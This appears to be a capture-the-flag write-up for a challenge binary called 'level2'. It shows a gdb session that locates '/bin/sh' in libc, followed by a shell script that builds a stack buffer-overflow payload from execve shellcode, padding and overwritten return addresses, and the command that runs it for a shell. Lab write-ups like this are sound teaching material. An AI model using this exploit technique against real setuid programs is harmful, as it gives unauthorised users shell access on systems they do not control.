Find `/bin/sh` in libc:

```
gdb ~/level2
(gdb) set disassembly-flavor intel
(gdb) set exec-wrapper env -i
(gdb) b main
Breakpoint 1 at 0x8048542
(gdb) r
Starting program: /home/user/level2/level2

Breakpoint 1, 0x08048542 in main ()
(gdb) info proc mappings
process 5122
Mapped address spaces:

	Start Addr   End Addr       Size     Offset objfile
	 0x8048000  0x8049000     0x1000        0x0 /home/user/level2/level2
	 0x8049000  0x804a000     0x1000        0x0 /home/user/level2/level2
	0xb7e2b000 0xb7e2c000     0x1000        0x0
	0xb7e2c000 0xb7fcf000   0x1a3000        0x0 /lib/i386-linux-gnu/libc-2.15.so
	0xb7fcf000 0xb7fd1000     0x2000   0x1a3000 /lib/i386-linux-gnu/libc-2.15.so
	0xb7fd1000 0xb7fd2000     0x1000   0x1a5000 /lib/i386-linux-gnu/libc-2.15.so
	0xb7fd2000 0xb7fd5000     0x3000        0x0
	0xb7fdb000 0xb7fdd000     0x2000        0x0
	0xb7fdd000 0xb7fde000     0x1000        0x0 [vdso]
	0xb7fde000 0xb7ffe000    0x20000        0x0 /lib/i386-linux-gnu/ld-2.15.so
	0xb7ffe000 0xb7fff000     0x1000    0x1f000 /lib/i386-linux-gnu/ld-2.15.so
	0xb7fff000 0xb8000000     0x1000    0x20000 /lib/i386-linux-gnu/ld-2.15.so
	0xbffdf000 0xc0000000    0x21000        0x0 [stack]
(gdb) find 0xb7e2c000, 0xb7fcf000, "/bin/sh"
0xb7f8cc58
1 pattern found.
(gdb) x/s 0xb7f8cc58
0xb7f8cc58:	 "/bin/sh"
```

Payload:

```sh
{
    # 8 bytes
    printf '/bin/sh\0'
    
    # 8 bytes
    perl -e 'print pack("L<" x 2, 0xbffffdfc, 0x00000000)'
    
    # 12 bytes
    # printf "\xB8\x01\x00\x00\x00\xBB\x68\x00\x00\x00\xCD\x80"
    
    # 22 bytes
    printf "\xB8\x0B\x00\x00\x00\xBB\xFC\xFD\xFF\xBF\xB9\x04\xFE\xFF\xBF\xBA\x00\x00\x00\x00\xCD\x80"

    perl -e 'print "\xff" x (76 - 8 - 8 - 22)'

    # saved ebp and saved eip from above
    perl -e 'print pack("L<" x 2, 0xbffffe58, 0x804854a)'
    
    # dunno what's there, fill with dummy
    perl -e 'print "A" x 8'
    
    # addresses of gets() stack buffer (saved ebp) and system() (saved eip)
    # + 4 -> saved ebp
    # + 4 -> saved eip
    perl -e 'print pack("L<" x 2, 0xbffffdfc - 40, 0xbffffdfc + 16)'
} > /tmp/2
```

Run with:

```
cat /tmp/2 - | env -i ~/level2
```
